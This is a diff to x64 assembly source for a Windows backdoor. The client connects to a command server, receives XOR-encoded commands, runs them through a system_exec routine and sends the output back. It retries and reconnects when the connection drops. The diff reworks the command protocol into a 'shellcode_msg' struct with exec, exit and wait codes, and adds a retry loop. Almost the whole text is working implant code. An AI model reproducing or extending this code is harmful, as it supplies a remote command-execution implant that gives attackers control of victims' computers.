@@ -10,14 +10,19 @@ include ..\include\ntdll.inc
 
 status_failure  equ 0xffffffff
 status_success  equ 0
-
-; Shellcode commands
+max_retries     equ 10
 buffer_size     equ 1024
-cmd_null        equ 0000b
-cmd_hello       equ 0001b
-cmd_ready       equ 0010b
-cmd_exec        equ 0100b
-cmd_exit        equ 1000b
+sleep_time      equ 1000
+cmd_exec        equ 001b
+cmd_exit        equ 010b
+cmd_wait        equ 100b
+
+shellcode_msg struct
+    command         byte ?
+    key             byte ?
+    buffer_length   dword ?
+    buffer          byte buffer_size dup(?)
+shellcode_msg ends
 
 ; Function prototypes
 memcpy      proto   fastcall :qword, :qword, :dword
@@ -27,7 +32,7 @@ system_exec proto   fastcall :qword, :qword
 _data$00 segment page 'data'
     g_command_ip        db "127.0.0.1", 0
     g_command_port      dw 1664
-    g_timeout             timeval <>
+    g_timeout           timeval <>
     g_timeout_sec       dw 5
     g_timeout_usec      dw 0
 _data$00 ends
@@ -35,20 +40,21 @@ _data$00 ends
 _text$00 segment align(10h) 'code'
 
     main proc
-        local socket_buffer[buffer_size]:byte
+        local command_buffer:shellcode_msg
         local output_buffer[buffer_size]:byte
         local wsa_data:wsadata
         local sock_addr:sockaddr_in
         local dw_socket:dword
         local dw_socket_buffer_size:dword
         local cipher_key:byte
+        local retries:dword
         ; Initialize Winsock
         invoke WSAStartup, 516, addr wsa_data
         test eax, eax
         jnz _exit
         
         ; Create a socket
-    _connect:
+    _create_socket:
         invoke socket, af_inet, sock_stream, ipproto_tcp
         cmp eax, socket_error
         je _exit
@@ -62,129 +68,68 @@ _text$00 segment align(10h) 'code'
         invoke htons, g_command_port
         mov sock_addr.sin_port, ax
 
-        ; Set receive timeout
-        mov ax, g_timeout_sec
-        mov g_timeout.tv_sec, ax
-        mov ax, g_timeout_usec
-        mov g_timeout.tv_usec, ax
-        invoke setsockopt, dw_socket, sol_socket, so_rcvtimeo, addr g_timeout_sec, sizeof timeval
-        cmp eax, socket_error
-        je _exit
-
         ; Connect to command server 
+    _connect:
         invoke connect, dw_socket, addr sock_addr, sizeof sock_addr
         cmp eax, socket_error
-        je _exit
+        je _reconnect
 
-        ; Send the client hello
-        invoke RtlZeroMemory, addr socket_buffer, buffer_size
-        mov byte ptr [socket_buffer], cmd_hello
-        invoke send, dw_socket, addr socket_buffer, sizeof byte, 0
+        ; Enter command loop
+        mov retries, 0
+        .while retries < max_retries -1
+            invoke RtlZeroMemory, addr command_buffer, sizeof command_buffer
 
-        ; Check server hello
-        invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
-        cmp eax, socket_error
-        je _exit
-        cmp byte ptr [socket_buffer], cmd_hello
-        jne _exit
-
-        ; Successfuly connected to command server; await commands
-        .while 1
-            ; Signal the client is ready
-            invoke RtlZeroMemory, addr socket_buffer, buffer_size
-            mov byte ptr [socket_buffer], cmd_ready
-            invoke send, dw_socket, addr socket_buffer, sizeof byte, 0
-            .if eax == socket_error
-                jmp _reconnect
+            ; Receive instructions from the command server
+            invoke recv, dw_socket, addr command_buffer, sizeof command_buffer, 0
+            .if eax == socket_error || eax == 0
+                mov eax, retries
+                inc eax
+                mov retries, eax
+                jmp _wait
             .endif
 
-            ; Check if the server is ready
-            mov byte ptr [socket_buffer], 0
-            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
-            .if eax == socket_error
-                jmp _reconnect
-            .endif
-            cmp byte ptr [socket_buffer], cmd_ready
-            
-            ; If nothing sent
-            .if eax == 0
-                .continue   
-            .elseif byte ptr [socket_buffer] == cmd_exit ; exit now
-                jmp _reconnect
-            .endif
-
-            ; Check if command key sent
-            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
-            .if eax == socket_error
-                jmp _reconnect
-            .elseif byte ptr [socket_buffer] != cmd_exec
-                jmp _reconnect
-            .endif
-
-            ; Receive the next cipher key
-            invoke recv, dw_socket, addr socket_buffer, sizeof byte, 0
-            cmp eax, socket_error
-            je _reconnect
-            mov al, byte ptr [socket_buffer]
-            mov [cipher_key], al
-
-            ; Receive the next command
-            invoke recv, dw_socket, addr socket_buffer, buffer_size, 0
-            cmp eax, socket_error
-            je _reconnect
-
-            ; Continue if the server has nothing for the client
-            .if eax == 0
-                .continue
-            .endif
-
-            ; Save the size of the last command
-            mov dw_socket_buffer_size, eax
-            
-            ; Check if exit command was sent
-            mov al, byte ptr [socket_buffer]
-            cmp al, cmd_exit
+            ; Check what command was sent
+            lea rax, command_buffer
+            cmp [rax].shellcode_msg.command, cmd_wait
+            je _wait
+            cmp [rax].shellcode_msg.command, cmd_exit
             je _exit
+            cmp [rax].shellcode_msg.command, cmd_exec
+            je _exec
+            .continue
+        _exec:
+            ; Decode the command buffer 
+            invoke xor_cipher, addr command_buffer.shellcode_msg.buffer, command_buffer.shellcode_msg.key, command_buffer.shellcode_msg.buffer_length
 
-            ; Decipher the supplied command
-            invoke xor_cipher, addr socket_buffer, cipher_key, buffer_size
-
-            ; Run the supplied command 
-            invoke system_exec, addr socket_buffer, addr output_buffer
+            ; Execute the command
+            invoke system_exec, addr command_buffer.shellcode_msg.buffer, addr output_buffer
             .if eax == status_failure
-                .continue
+                mov eax, retries
+                inc eax
+                mov retries, eax
+                jmp _wait
             .endif
-            
-            ; Return the result
+
+            ; Post the result back to the server
             invoke send, dw_socket, addr output_buffer, eax, 0
+        _wait:
+            invoke Sleep, sleep_time
             .continue
         .endw
+
         jmp _reconnect
+
     _exit:
+        invoke shutdown, dw_socket, sd_both
+        invoke closesocket, dw_socket
         invoke WSACleanup
         ret
 
     _reconnect:
-        invoke shutdown, dw_socket, sd_both
         invoke closesocket, dw_socket
         invoke Sleep, 1000
-        jmp _connect
+        jmp _create_socket
     main endp
-
-    xor_cipher proc fastcall uses rbx r8, buffer_addr:qword, key:byte, xor_buffer_size:dword
-        mov dl, key                 ; Move the XOR key into rdx
-        mov r8d, xor_buffer_size    ; Move the size into r8 (loop counter)
-        
-    _xor_next_byte:
-        lea rbx, [rcx + r8 - 1]     ; Load effective address of the current byte
-        xor rax, rax                ; Clear rax (ensure only lower 8 bits are used)
-        movzx rax, byte ptr [rbx]   ; Move the byte into al, zero-extending to rax
-        xor al, dl                  ; XOR the byte with the key
-        mov [rbx], al               ; Store the result back into the buffer
-        dec r8                      ; Decrement the loop counter
-        jne _xor_next_byte          ; Jump if there are more bytes to process
-        ret
-    xor_cipher endp
 
     system_exec proc fastcall, system_exec_buffer:qword, out_buffer:qword
         local pipe_buffer[buffer_size]:byte
@@ -281,6 +226,20 @@ _text$00 segment align(10h) 'code'
             mov eax, dword ptr [status]
             ret
     system_exec endp
+
+    xor_cipher proc fastcall buffer_addr:qword, key:byte, xor_buffer_size:dword
+        xor eax, eax
+    _loop:
+        cmp eax, r8d
+        je _done
+        mov r9b, byte ptr [rcx + rax]
+        xor r9b, dl
+        mov byte ptr [rcx + rax], r9b
+        inc eax
+        jmp _loop
+    _done:
+        ret
+    xor_cipher endp
 
 _text$00 ends
 
